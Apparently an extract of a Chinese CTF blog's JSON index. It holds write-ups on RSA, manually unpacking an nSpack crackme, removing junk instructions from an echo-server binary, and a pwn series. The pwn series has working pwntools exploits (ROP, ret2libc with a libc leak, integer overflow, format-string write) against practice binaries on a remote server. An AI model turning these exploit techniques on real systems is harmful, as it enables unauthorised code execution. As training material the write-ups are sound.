275127860351348928173285174381581152299q = 319576316814478949870590164193048041239d = gmpy2.invert(e, (p - 1) * (q - 1))#print(d)m = pow(r, int(d), n)print(num2str(m))# PCTF{256b_i5_m3dium}","link":"/2020/05/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto-wp/"},{"title":"攻防世界-crackme-wp（手动脱壳）","text":"这里以攻防世界的一道简单的题目来记录一下手动脱壳相关内容，其实理解了原理之后也是非常简单的一件事。 首先看看攻防世界的这道crackme。 查壳PEiD查一查，发现有壳，nSpack，并不是常见的upx，也懒得去找工具，这样一道简单的题目肯定不会用很复杂的壳，所以开始徒手脱壳。 找OEP手动脱壳的第一步，就是要找到程序的OEP，就是真正的程序入口点。这个要从壳的原理说起，所谓的压缩壳、加密壳，作用都是要隐藏程序真正的入口点，在壳加载的过程中对数据进行解压和解密并放到相应的段，然后壳的作用就结束了，这个时候会从壳进入真正的程序，这个时候会有一个真正的程序入口，就是OEP，不管脱什么壳，首先都是要找到OEP。 首先OD打开调试（不管用什么调试都差不多，IDA也是可以的，并且也有相应的Dump脚本，过程上没什么太大的差别） 首先看到pushfd和pushad两条命令，这是记录所有寄存器，这里我根据esp定律，实际上也就是堆栈平衡的原理，在执行完pushad之后对esp下断点 下面简单介绍一下esp定律： 一般的加壳软件在执行时，首先要初始化，保存环境（保存各个寄存器的值），一般利用pushad（相当于把eax,ecx,edx,ebx,esp,ebp,esi,edi都压栈），当加壳程序的外壳执行完毕以后，再来恢复各个寄存器的内容，通常会用POPAD（相当与把刚刚保存的寄存器的值都还原），在脱壳的时候，我们可以根据堆栈平衡来对ESP进行下断，进而快速到达OEP 使用硬件读断点（hw esp），这里只经过了两次跳转，然后就来到了OEP附近，这里也需要注意，OEP处的esp并不一定是之前记录的值，但是一定很近了，这个时候需要耐心的寻找疑似的OEP。这里的OEP我找到实在0x401000处 这里显然就是程序真正的入口。还有一点需要注意，壳加载过程中会加载代码，所以如果遇到没有解析的数据，就Ctrl+A重新分析代码。 Dump接下来要把内存中的完整程序Dump出来，好像OD有相关的插件，但我还是喜欢LordPE，使用也很简单，就是注意右键进程，修正镜像大小，因为有人会改镜像的大小，Dump出来的程序会有问题，所以一般不去判断，直接先修正，再Dump 修正IAT这个时候Dump出来的程序时没法运行的，因为缺少了很关键的一部分内容，就是IAT，也就是输入表，我们可以把现在Dump出来的程序用IDA打开，可以看到printf和scanf之类的函数都识别不出来，这就是因为我们Dump出来的程序没有输入表。至于输入表是什么，偷懒从百度百科抄了过来，这是PE结构中很重要的一部分。 Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中。当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 IAT当然可以自己动手改Dump出来的程序的16进制，但是我还是喜欢用ImportREC（明明有工具为什么还要自己动手……还容易写错）。 使用起来很简单，首先要把我们知道的OEP地址输入进去，注意这里是偏移地址，然后可以选择IAT Autosearch选项，但有的时候可能会不准确，这个时候可以手动寻找，RVA就是相对虚拟地址，Size就是大小，手动找的过程也很简单，只要找到调用的函数的部分，比如说printf，就可以在汇编代码里看到调用的地址，比如说dword ptr [402094]，这是个间接取址，这里取的是402094处指针指向的地址，这里才是真正的printf函数的入口，我们转到402094的位置，可以看到上下都有很多这样的指针，指向外部引用的函数，这里就是输入表 两个不同的dll中间用0隔开，所以找到开始地址和结束地址，就能知道RVA和Size。 这个时候点Get Imports，中间窗口会显示出来，但是注意有时候会出现无效的值，这个时候可能需要手动修复或者是删除，如果全都显示有效，就可以Fix Dump，选择刚刚Dump出来的文件，成功的话会生成一个新的文件，这个文件是可以执行的程序，到这里脱壳的过程就结束了。 解题回到题目本身，IDA打开 123456789101112131415161718192021222324252627282930313233signed int start(){ signed int result; // eax int v1; // eax char Buf; // [esp+4h] [ebp-38h] char Dst; // [esp+5h] [ebp-37h] Buf = 0; memset(&amp;Dst, 0, 0x31u); printf(\"Please Input Flag:\"); gets_s(&amp;Buf, 0x2Cu); if ( strlen(&amp;Buf) == 42 ) { v1 = 0; while ( (*(&amp;Buf + v1) ^ byte_402130[v1 % 16]) == dword_402150[v1] ) { if ( ++v1 &gt;= 42 ) { printf(\"right!\\n\"); goto LABEL_8; } } printf(\"error!\\n\");LABEL_8: result = 0; } else { printf(\"error!\\n\"); result = -1; } return result;} 发现程序的判断非常简单，可见这题的主要目的是为了考脱壳，把需要的数据导出之后，直接简单逆向输出flag 123456789101112131415161718#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int dword_402150[] = { 18, 4, 8, 20, 36, 92, 74, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18}; char aThisIsNotFlag[] = \"this_is_not_flag\"; string flag; for(int i =0;i&lt;42;i++) { flag+=(dword_402150[i]^aThisIsNotFlag[i%16]); } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 输出得到flag 1flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}","link":"/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/"},{"title":"攻防世界_echo-server_wp","text":"这题涉及到去花和patch，难度不是很大 先file查看一下文件，32位ELF，运行一下 123**************Echo Server 0.3 ALPHA************** 等待输入，随便输入一句 12hhh686868 直接返回了ASCII码值 用IDA打开看看 123456789int __cdecl main(){ setbuf(stdin, 0); setbuf(stdout, 0); dword_804A088 = 1; puts(\" **************\\n Echo Server 0.3 ALPHA\\n **************\"); ((void (*)(void))((char *)&amp;loc_80487C1 + 3))(); return 0;} main函数没什么特别的，就是最后这个函数调用很古怪，所以进去看看 1234567891011121314151617181920212223242526void __cdecl sub_804875D(unsigned __int8 *a1, unsigned int a2){ unsigned __int8 *v2; // eax char v3; // zf unsigned __int8 *v4; // [esp+18h] [ebp-10h] unsigned int i; // [esp+1Ch] [ebp-Ch] v4 = a1; if ( a1 ) { for ( i = 0; i &lt; a2; ++i ) { v2 = v4++; printf(\"%02X\", *v2); } } else { printf(\"NULL\"); } putchar(10); JUMPOUT(v3, (char *)&amp;loc_80487C1 + 1); JUMPOUT(!v3, (char *)&amp;loc_80487C1 + 1); MEMORY[0x915A4B8F](); JUMPOUT(loc_80487C6);} 出现了访问内存越界的情况MEMORY[0x915A4B8F]()，看到上面两句更加古怪 12JUMPOUT(v3, (char *)&amp;loc_80487C1 + 1);JUMPOUT(!v3, (char *)&amp;loc_80487C1 + 1); 这里很明显是强行创造多条分支，IDA使用递归行进算法，就会默认这条路径接这两个函数执行过后的指令是有效的而去扫描分析后面的指令，但实际上，后面是永远不会到达的指令，不管v3的值是多少，都会跳转到(char *)&amp;loc_80487C1 + 1这显然是一条花指令，所以查看一下汇编代码准备去花 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960.text:0804875D ; Attributes: bp-based frame.text:0804875D.text:0804875D sub_804875D proc near.text:0804875D.text:0804875D var_10 = dword ptr -10h.text:0804875D var_C = dword ptr -0Ch.text:0804875D arg_0 = dword ptr 8.text:0804875D arg_4 = dword ptr 0Ch.text:0804875D.text:0804875D ; __unwind {.text:0804875D push ebp.text:0804875E mov ebp, esp.text:08048760 sub esp, 28h.text:08048763 mov eax, [ebp+arg_0].text:08048766 mov [ebp+var_10], eax.text:08048769 cmp [ebp+arg_0], 0.text:0804876D jnz short loc_804877D.text:0804876F mov dword ptr [esp], offset format ; \"NULL\".text:08048776 call _printf.text:0804877B jmp short loc_80487B1.text:0804877D ; ---------------------------------------------------------------------------.text:0804877D.text:0804877D loc_804877D: ; CODE XREF: sub_804875D+10↑j.text:0804877D mov [ebp+var_C], 0.text:08048784 jmp short loc_80487A9.text:08048786 ; ---------------------------------------------------------------------------.text:08048786.text:08048786 loc_8048786: ; CODE XREF: sub_804875D+52↓j.text:08048786 mov eax, [ebp+var_10].text:08048789 lea edx, [eax+1].text:0804878C mov [ebp+var_10], edx.text:0804878F movzx eax, byte ptr [eax].text:08048792 movzx eax, al.text:08048795 mov [esp+4], eax.text:08048799 mov dword ptr [esp], offset a02x ; \"%02X\".text:080487A0 call _printf.text:080487A5 add [ebp+var_C], 1.text:080487A9.text:080487A9 loc_80487A9: ; CODE XREF: sub_804875D+27↑j.text:080487A9 mov eax, [ebp+var_C].text:080487AC cmp eax, [ebp+arg_4].text:080487AF jb short loc_8048786.text:080487B1.text:080487B1 loc_80487B1: ; CODE XREF: sub_804875D+1E↑j.text:080487B1 mov dword ptr [esp], 0Ah ; c.text:080487B8 call _putchar.text:080487BD jz short near ptr loc_80487C1+1.text:080487BF jnz short near ptr loc_80487C1+1.text:080487C1.text:080487C1 loc_80487C1: ; CODE XREF: sub_804875D+60↑j.text:080487C1 ; sub_804875D+62↑j ....text:080487C1 call near ptr 915A4B8Fh.text:080487C1 sub_804875D endp ; sp-analysis failed.text:080487C1.text:080487C6.text:080487C6 loc_80487C6: ; DMA page register 74LS612:.text:080487C6 in eax, 81h ; Channel 2 (diskette DMA) (address bits 16-23).text:080487C8 in al, dx.text:080487C9 mov [eax], al.text:080487C9 ; --------------------------------------------------------------------------- 这个函数显然是不对的，堆栈本身并没有平衡，main函数里跳到的地方是0x080487C4已经被其它指令占了，这里去花一下，多余的指令码干脆用noppatch掉 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455sub_804875D proc near.text:0804875D.text:0804875D var_10 = dword ptr -10h.text:0804875D var_C = dword ptr -0Ch.text:0804875D arg_0 = dword ptr 8.text:0804875D arg_4 = dword ptr 0Ch.text:0804875D.text:0804875D ; __unwind {.text:0804875D push ebp.text:0804875E mov ebp, esp.text:08048760 sub esp, 28h.text:08048763 mov eax, [ebp+arg_0].text:08048766 mov [ebp+var_10], eax.text:08048769 cmp [ebp+arg_0], 0.text:0804876D jnz short loc_804877D.text:0804876F mov dword ptr [esp], offset format ; \"NULL\".text:08048776 call _printf.text:0804877B jmp short loc_80487B1.text:0804877D ; ---------------------------------------------------------------------------.text:0804877D.text:0804877D loc_804877D: ; CODE XREF: sub_804875D+10↑j.text:0804877D mov [ebp+var_C], 0.text:08048784 jmp short loc_80487A9.text:08048786 ; ---------------------------------------------------------------------------.text:08048786.text:08048786 loc_8048786: ; CODE XREF: sub_804875D+52↓j.text:08048786 mov eax, [ebp+var_10].text:08048789 lea edx, [eax+1].text:0804878C mov [ebp+var_10], edx.text:0804878F movzx eax, byte ptr [eax].text:08048792 movzx eax, al.text:08048795 mov [esp+4], eax.text:08048799 mov dword ptr [esp], offset a02x ; \"%02X\".text:080487A0 call _printf.text:080487A5 add [ebp+var_C], 1.text:080487A9.text:080487A9 loc_80487A9: ; CODE XREF: sub_804875D+27↑j.text:080487A9 mov eax, [ebp+var_C].text:080487AC cmp eax, [ebp+arg_4].text:080487AF jb short loc_8048786.text:080487B1.text:080487B1 loc_80487B1: ; CODE XREF: sub_804875D+1E↑j.text:080487B1 mov dword ptr [esp], 0Ah ; c.text:080487B8 call _putchar.text:080487BD jz short locret_80487C2.text:080487BF jnz short locret_80487C2.text:080487C1 nop ; Keypatch modified this from:.text:080487C1 ; db 0E8h.text:080487C2.text:080487C2 locret_80487C2: ; CODE XREF: sub_804875D+60↑j.text:080487C2 ; sub_804875D+62↑j.text:080487C2 leave.text:080487C3 retn.text:080487C3 ; } // starts at 804875D.text:080487C3 sub_804875D endp 这是这个函数本来的样子，而main函数里面调用的根本就不是这个函数，而是下面 1234567891011121314151617181920.text:080487C4 ; ---------------------------------------------------------------------------.text:080487C4 ; __unwind {.text:080487C4 push ebp ; CODE XREF: main+49↓p.text:080487C5 mov ebp, esp.text:080487C7 sub esp, 88h.text:080487CD mov eax, large gs:14h.text:080487D3 mov [ebp-0Ch], eax.text:080487D6 xor eax, eax.text:080487D8 mov dword ptr [esp+8], 14h.text:080487E0 mov dword ptr [esp+4], 0.text:080487E8 lea eax, [ebp-70h].text:080487EB mov [esp], eax.text:080487EE call _memset.text:080487F3.text:080487F3 loc_80487F3: ; CODE XREF: .text:loc_80487F3↑j.text:080487F3 jmp short near ptr loc_80487F3+1.text:080487F3 ; ---------------------------------------------------------------------------.text:080487F5 db 0C0h.text:080487F6 db 48h ; H.text:080487F7 db 0C7h 下面并没有分析，因为又遇到了一个花指令 1.text:080487F3 jmp short near ptr loc_80487F3+1 代码重叠，分析一下本来的指令是什么 1234567891011text:080487F4 ; ---------------------------------------------------------------------------.text:080487F4 inc eax.text:080487F6 dec eax.text:080487F7 mov dword ptr [esp+8], 14h.text:080487FF lea eax, [ebp-70h].text:08048802 mov [esp+4], eax.text:08048806 mov dword ptr [esp], 0.text:0804880D call _read.text:08048812 xor eax, eax.text:08048814 jz short loc_804881D.text:08048816 jmp near ptr 6F44B961h 又来 12.text:08048812 xor eax, eax.text:08048814 jz short loc_804881D 自己和自己异或肯定是0，这个跳转是一定会实现的，后面的语句并没有什么用但是IDA还是进行了分析然后出错，patch掉继续看 12345678910111213141516171819.text:08048816 nop ; Keypatch modified this from:.text:08048816 ; db 0E9h.text:08048816 ; ---------------------------------------------------------------------------.text:08048817 aF1Ga db 'F1@gA',0.text:0804881D ; ---------------------------------------------------------------------------.text:0804881D.text:0804881D loc_804881D: ; CODE XREF: .text:08048814↑j.text:0804881D mov dword ptr [esp+8], 5.text:08048825 mov dword ptr [esp+4], 8048817h.text:0804882D lea eax, [ebp-70h].text:08048830 mov [esp], eax.text:08048833 call _strncmp.text:08048838 test eax, eax.text:0804883A jnz short loc_80488A3.text:0804883C mov dword ptr [esp], offset aYouAreVeryClos ; \"You are very close! Now patch me~\".text:08048843 call _puts.text:08048848 mov eax, ds:dword_804A088.text:0804884D test eax, eax.text:0804884F jz short loc_8048866 去花之后变成了一个字符串，后面还有一个比较操作，如果输入这个字符串，就会输出You are very close! Now patch me~ 后面肯定还有操作，往后面看 123.text:08048848 mov eax, ds:dword_804A088.text:0804884D test eax, eax.text:0804884F jz short loc_8048866 这三句很关键，如果eax是0，就会进行后面的跳转，所以查找一下ds:dword_804A088交叉引用，在main里面发现 1.text:08048913 mov ds:dword_804A088, 1 所以这个跳转是永远不会实现的，先看看不跳转后面会执行什么 1234.text:08048851 loc_8048851: ; CODE XREF: .text:08048857↓j.text:08048851 mov ax, 5EBh.text:08048855 xor eax, eax.text:08048857 jz short near ptr loc_8048851+1 又是一个花指令，重新分析这几句 123.text:08048852 loc_8048852: ; CODE XREF: .text:08048857↓j.text:08048852 mov eax, 0C03105EBh.text:08048857 jz short loc_8048852 发现进入了一个死循环，所以题目让我们patch的意思是不走这个循环，也就是真正应该执行的是前面没走的那个分支 123456789101112131415161718192021222324252627282930313233343536373839404142loc_8048866: ; CODE XREF: .text:0804884F↑j.text:08048866 lea eax, [ebp-70h].text:08048869 mov [esp], eax.text:0804886C call _strlen.text:08048871 mov dword ptr [esp+8], 0.text:08048879 mov [esp+4], eax.text:0804887D lea eax, [ebp-70h].text:08048880 add eax, 1.text:08048883 mov [esp], eax.text:08048886 call _MD5.text:0804888B mov [ebp-74h], eax.text:0804888E mov dword ptr [esp+4], 10h.text:08048896 mov eax, [ebp-74h].text:08048899 mov [esp], eax.text:0804889C call sub_804875D.text:080488A1 jmp short loc_80488C0.text:080488A3 ; ---------------------------------------------------------------------------.text:080488A3.text:080488A3 loc_80488A3: ; CODE XREF: .text:0804883A↑j.text:080488A3 lea eax, [ebp-70h].text:080488A6 mov [esp], eax.text:080488A9 call _strlen.text:080488AE sub eax, 1.text:080488B1 mov [esp+4], eax.text:080488B5 lea eax, [ebp-70h].text:080488B8 mov [esp], eax.text:080488BB call sub_804875D.text:080488C0.text:080488C0 loc_80488C0: ; CODE XREF: .text:080488A1↑j.text:080488C0 mov eax, ds:stdout.text:080488C5 mov [esp], eax.text:080488C8 call _fflush.text:080488CD mov eax, [ebp-0Ch].text:080488D0 xor eax, large gs:14h.text:080488D7 jz short locret_80488DE.text:080488D9 call ___stack_chk_fail.text:080488DE ; ---------------------------------------------------------------------------.text:080488DE.text:080488DE locret_80488DE: ; CODE XREF: .text:080488D7↑j.text:080488DE leave.text:080488DF retn.text:080488DF ; } // starts at 80487C4 执行到结束，计算了一个md5然后调用最开始分析的sub_804875D函数以16进制的形式输出，所以这里有两个选择，有linux环境可以直接patch跳转语句然后执行得到flag 1234567-&gt;./echo-server ************** Echo Server 0.3 ALPHA **************F1@gAYou are very close! Now patch me~F8C60EB40BF66919A77C4BD88D45DEF4 当然也可以自己算md5，看看关键函数 123456789.text:08048866 lea eax, [ebp-70h].text:08048869 mov [esp], eax.text:0804886C call _strlen.text:08048871 mov dword ptr [esp+8], 0.text:08048879 mov [esp+4], eax.text:0804887D lea eax, [ebp-70h].text:08048880 add eax, 1.text:08048883 mov [esp], eax.text:08048886 call _MD5 首先是把我们输入的字符串的地址拷贝到eax中，把该地址写到栈顶，调用_strlen，求的就是我们输入的字符串的长度，我们输入的是'F1@gA\\n'，返回的值是0x06，储存在eax中，写到了栈顶的第二个位置（第三个位置的0并不知道什么意思，或许是第三个参数，没查到函数原型，暂时先不管了），但是栈顶元素并不是我们输入的字符串，而是首地址加1的位置，长度还是6，所以要用md5加密的字符串应该是'1@gA\\x0a\\x00'，python调用hashlib算一下 12345import hashlibm=hashlib.md5()m.update(b'1@gA\\x0a\\x00')m.hexdigest().upper()#'F8C60EB40BF66919A77C4BD88D45DEF4' 两种方法都可以得到flag 1F8C60EB40BF66919A77C4BD88D45DEF4 其实这题并没有什么难度，为什么写这么长呢？ (实在不想写数据结构作业)","link":"/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/"},{"title":"攻防世界-pwn部分题解（一）","text":"一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn level2checksec一下，开了NX 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp){ vulnerable_function(); system(\"echo 'Hello World!'\"); return 0;}ssize_t vulnerable_function(){ char buf; // [esp+0h] [ebp-88h] system(\"echo Input:\"); return read(0, &amp;buf, 0x100u);} 程序中调用了system，在字符串视图里也找到了\"/bin/sh\"，所以构造一个ROP就可以，exp如下 12345678910111213from pwn import *io=process('./level2')# io=remote('111.198.29.45',52249)elf=ELF('./level2')sys_addr=elf.symbols['system']sh_addr=elf.search('/bin/sh').next()payload='a'*(0x88+4)+p32(sys_addr)+p32(0)+p32(sh_addr)io.sendline(payload)io.interactive() guess_num123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main(__int64 a1, char **a2, char **a3){ FILE *v3; // rdi const char *v4; // rdi int v6; // [rsp+4h] [rbp-3Ch] int i; // [rsp+8h] [rbp-38h] int v8; // [rsp+Ch] [rbp-34h] char v9; // [rsp+10h] [rbp-30h] unsigned int seed[2]; // [rsp+30h] [rbp-10h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); v3 = stderr; setbuf(stderr, 0LL); v6 = 0; v8 = 0; *(_QWORD *)seed = sub_BB0(v3, 0LL); puts(\"-------------------------------\"); puts(\"Welcome to a guess number game!\"); puts(\"-------------------------------\"); puts(\"Please let me know your name!\"); printf(\"Your name:\"); gets(&amp;v9); v4 = (const char *)seed[0]; srand(seed[0]); for ( i = 0; i &lt;= 9; ++i ) { v8 = rand() % 6 + 1; printf(\"-------------Turn:%d-------------\\n\", (unsigned int)(i + 1)); printf(\"Please input your guess number:\"); __isoc99_scanf(\"%d\", &amp;v6); puts(\"---------------------------------\"); if ( v6 != v8 ) { puts(\"GG!\"); exit(1); } v4 = \"Success!\"; puts(\"Success!\"); } sub_C3E(v4); return 0LL;} 这里首先看到是猜随机生成的数，然后如果所有的数都猜对了，就调用最后一个函数输出flag，首先的想法就是要替换掉seed，变成我们已知的数字，就可以调用相同版本的libc里的随机数生成函数，来生成同样的数，exp如下: 1234567891011121314151617from pwn import *from ctypes import *# io = process('./guess_num')io = remote('111.198.29.45', 46930)# elf=ELF('./guess_num')# libc=elf.libclibc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\")payload = 'a'*0x20 + p64(0)io.recvuntil('Your name:')io.sendline(payload)libc.srand(0)for i in range(10): num = str(libc.rand() % 6+1) io.recvuntil('number:') io.sendline(num)io.interactive() int_overflow1234567891011121314151617181920212223242526272829int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [esp+Ch] [ebp-Ch] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); puts(\"---------------------\"); puts(\"~~ Welcome to CTF! ~~\"); puts(\" 1.Login \"); puts(\" 2.Exit \"); puts(\"---------------------\"); printf(\"Your choice:\"); __isoc99_scanf(\"%d\", &amp;v4); if ( v4 == 1 ) { login(); } else { if ( v4 == 2 ) { puts(\"Bye~\"); exit(0); } puts(\"Invalid Choice!\"); } return 0;} 肯定选择1，进入login()函数 1234567891011121314151617181920212223242526272829303132333435int login(){ char buf; // [esp+0h] [ebp-228h] char s; // [esp+200h] [ebp-28h] memset(&amp;s, 0, 0x20u); memset(&amp;buf, 0, 0x200u); puts(\"Please input your username:\"); read(0, &amp;s, 0x19u); printf(\"Hello %s\\n\", &amp;s); puts(\"Please input your passwd:\"); read(0, &amp;buf, 0x199u); return check_passwd(&amp;buf);}char *__cdecl check_passwd(char *s){ char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) { puts(\"Invalid Password\"); result = (char *)fflush(stdout); } else { puts(\"Success\"); fflush(stdout); result = strcpy(&amp;dest, s); } return result;} 然后发现了一个奇怪的函数，可以利用 1234int what_is_this(){ return system(\"cat flag\");} 按理说我们只需要覆盖掉check_passwd()的返回值，然后伪造system栈帧就可以了，但是这里限制了我们输入的长度，但是观察汇编之后发现这个变量值是从al寄存器mov过来的，只能存储0-255的数字，因此我们可以输入259-263之间的字符数，就可以实现我们的目标，exp如下: 123456789101112131415from pwn import *elf=ELF('./int_overflow')sys_addr=elf.symbols['what_is_this']# print hex(sys_addr)# io=process('./int_overflow')io=remote('111.198.29.45',41386)io.sendlineafter('Your choice:','1')io.sendlineafter('Please input your username:','rycbar')io.recvuntil('Please input your passwd:')payload='a'*0x14+'a'*4+p32(sys_addr)payload=payload.ljust(263,'a')io.send(payload)io.recv()io.interactive() cgpwn212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int __cdecl main(int argc, const char **argv, const char **envp){ setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); hello(); puts(\"thank you\"); return 0;}char *hello(){ char *v0; // eax signed int v1; // ebx unsigned int v2; // ecx char *v3; // eax char s; // [esp+12h] [ebp-26h] int v6; // [esp+14h] [ebp-24h] v0 = &amp;s; v1 = 30; if ( (unsigned int)&amp;s &amp; 2 ) { *(_WORD *)&amp;s = 0; v0 = (char *)&amp;v6; v1 = 28; } v2 = 0; do { *(_DWORD *)&amp;v0[v2] = 0; v2 += 4; } while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) ); v3 = &amp;v0[v2]; if ( v1 &amp; 2 ) { *(_WORD *)v3 = 0; v3 += 2; } if ( v1 &amp; 1 ) *v3 = 0; puts(\"please tell me your name\"); fgets(name, 50, stdin); puts(\"hello,you can leave some message here:\"); return gets(&amp;s);}int pwn(){ return system(\"echo hehehe\");} 所有需要用到的函数都在这里，可以看到自带system函数，但是没有/bin/sh，所以需要手动构造，正好之前输入了一个name是一个全局变量，可以直接找到地址，以此构造ROP，exp如下： 1234567891011from pwn import *sh_addr=0x0804A080elf=ELF('./cgpwn2')sys_addr=elf.symbols['system']io=process('./cgpwn2')io=remote('111.198.29.45',52898)io.sendlineafter('please tell me your name','/bin/sh')io.recvuntil('hello,you can leave some message here:')payload='a'*0x26+p32(0)+p32(sys_addr)+p32(0)+p32(sh_addr)io.sendline(payload)io.interactive() when_did_you_born简单的栈溢出，经典题目，有膜法 123456789from pwn import *# io=process('./when_did_you_born')io=remote('111.198.29.45',47087)io.sendlineafter('What\\'s Your Birth?','1000')io.recvuntil(\"What's Your Name?\")payload='a'*(0x20-0x18)+p64(1926)io.sendline(payload)io.interactive() hello_pwn比上一题更简单的溢出（半斤八两） 1234567from pwn import *# io=process('./hello_pwn')io=remote('111.198.29.45',42456)io.recvuntil('bof')payload='a'*4+p64(1853186401)io.sendline(payload)io.interactive() level3ret2libc，泄露一个函数地址然后算偏移，控制程序流程再执行一次漏洞函数，拿到shell 1234567891011121314151617181920212223from pwn import *from LibcSearcher import *# io=process('./level3')io=remote('111.198.29.45',41019)elf=ELF('./level3')write_plt=elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']write_got=elf.got['write']payload='a'*0x88+p32(0)+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil('Input:\\n')io.sendline(payload)write_leak=u32(io.recv()[:4])libc=LibcSearcher('write',write_leak)libc_base = write_leak - libc.dump('write')sys_addr=libc_base+libc.dump('system')bin_sh_addr=libc_base+libc.dump('str_bin_sh')io.recv()payload='a'*0x88+p32(0)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)io.sendline(payload)io.interactive() 这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因 level0也是很简单的一道题，但不知道为什么gdb和远程都能过，就是本地直接运行一直报segmentation fault 1234567891011from pwn import *sys_addr=0x400596pop_ret_addr=0x400663main_addr=0x4005c6 # io=process('./level0/level0')io=remote('111.198.29.45',47038)payload='a'*(0x80+8)+p64(sys_addr)# print payloadio.recv()io.send(payload)io.interactive() CGfsb格式化字符串漏洞的利用 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp){ int buf; // [esp+1Eh] [ebp-7Eh] int v5; // [esp+22h] [ebp-7Ah] __int16 v6; // [esp+26h] [ebp-76h] char s; // [esp+28h] [ebp-74h] unsigned int v8; // [esp+8Ch] [ebp-10h] v8 = __readgsdword(0x14u); setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); buf = 0; v5 = 0; v6 = 0; memset(&amp;s, 0, 0x64u); puts(\"please tell me your name:\"); read(0, &amp;buf, 0xAu); puts(\"leave your message please:\"); fgets(&amp;s, 100, stdin); printf(\"hello %s\", &amp;buf); puts(\"your message is:\"); printf(&amp;s); if ( pwnme == 8 ) { puts(\"you pwned me, here is your flag:\\n\"); system(\"cat flag\"); } else { puts(\"Thank you!\"); } return 0;} 两次输入，第一次只能输入10个字符，不够我们构造payload，所以利用第二次输入的格式化字符串漏洞实现任意地址可写，修改pwnme的值，exp如下： 123456789from pwn import *pwnme=0x0804A068payload=p32(pwnme)+'a'*4+'%10$n'# io=process('./CGfsb')io=remote('111.198.29.45',37888)io.sendlineafter('name:','a')io.recvuntil('please:')io.sendline(payload)io.interactive() 很简单，直接输出flag 1cyberpeace{428fd5c839a04a6d162bdd6610a094cf} forgot这道题简单的溢出就可以解决了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990int __cdecl main(){ size_t v0; // ebx char v2[32]; // [esp+10h] [ebp-74h] int (*v3)(); // [esp+30h] [ebp-54h] int (*v4)(); // [esp+34h] [ebp-50h] int (*v5)(); // [esp+38h] [ebp-4Ch] int (*v6)(); // [esp+3Ch] [ebp-48h] int (*v7)(); // [esp+40h] [ebp-44h] int (*v8)(); // [esp+44h] [ebp-40h] int (*v9)(); // [esp+48h] [ebp-3Ch] int (*v10)(); // [esp+4Ch] [ebp-38h] int (*v11)(); // [esp+50h] [ebp-34h] int (*v12)(); // [esp+54h] [ebp-30h] char s; // [esp+58h] [ebp-2Ch] int v14; // [esp+78h] [ebp-Ch] size_t i; // [esp+7Ch] [ebp-8h] v14 = 1; v3 = sub_8048604; v4 = sub_8048618; v5 = sub_804862C; v6 = sub_8048640; v7 = sub_8048654; v8 = sub_8048668; v9 = sub_804867C; v10 = sub_8048690; v11 = sub_80486A4; v12 = sub_80486B8; puts(\"What is your name?\"); printf(\"&gt; \"); fflush(stdout); fgets(&amp;s, 32, stdin); sub_80485DD((int)&amp;s); fflush(stdout); printf(\"I should give you a pointer perhaps. Here: %x\\n\\n\", sub_8048654); fflush(stdout); puts(\"Enter the string to be validate\"); printf(\"&gt; \"); fflush(stdout); __isoc99_scanf(\"%s\", v2); for ( i = 0; ; ++i ) { v0 = i; if ( v0 &gt;= strlen(v2) ) break; switch ( v14 ) { case 1: if ( sub_8048702(v2[i]) ) v14 = 2; break; case 2: if ( v2[i] == 64 ) v14 = 3; break; case 3: if ( sub_804874C(v2[i]) ) v14 = 4; break; case 4: if ( v2[i] == 46 ) v14 = 5; break; case 5: if ( sub_8048784(v2[i]) ) v14 = 6; break; case 6: if ( sub_8048784(v2[i]) ) v14 = 7; break; case 7: if ( sub_8048784(v2[i]) ) v14 = 8; break; case 8: if ( sub_8048784(v2[i]) ) v14 = 9; break; case 9: v14 = 10; break; default: continue; } } (*(&amp;v3 + --v14))(); return fflush(stdout);} 有两个输入的地方，第一个地方严格控制了输入的字符数，所以没什么用，第二个用了scanf，可以无限制的输入，利用这个地方来控制我们的程序。 这个程序开了NX，所以找找有没有可以利用的函数，找到 1234567int sub_80486CC(){ char s; // [esp+1Eh] [ebp-3Ah] snprintf(&amp;s, 0x32u, \"cat %s\", \"./flag\"); return system(&amp;s);} 